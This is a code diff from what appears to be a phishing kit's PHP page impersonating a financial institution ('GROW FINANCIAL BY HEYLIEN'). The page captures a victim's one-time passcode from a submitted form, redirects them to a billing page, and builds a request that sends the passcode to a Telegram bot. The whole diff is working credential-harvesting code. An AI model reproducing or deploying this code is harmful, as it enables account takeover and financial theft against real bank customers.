@@ -10,8 +10,9 @@
     <link rel="stylesheet" href="output.css">
     <?php
                     if (isset($_POST['submit'])) {
+                        require './form.php';
                         header('Location: billing.php');
-                        require 'form.php';
+                        echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . "/billing.php" . '">';
                         define('url', "https://api.telegram.org/bot".$token.'/');
                         $OTP = $_POST['otp'];
                         $message = urlencode("GROW FINANCIAL BY HEYLIEN" . "\nOTP: " . $OTP);
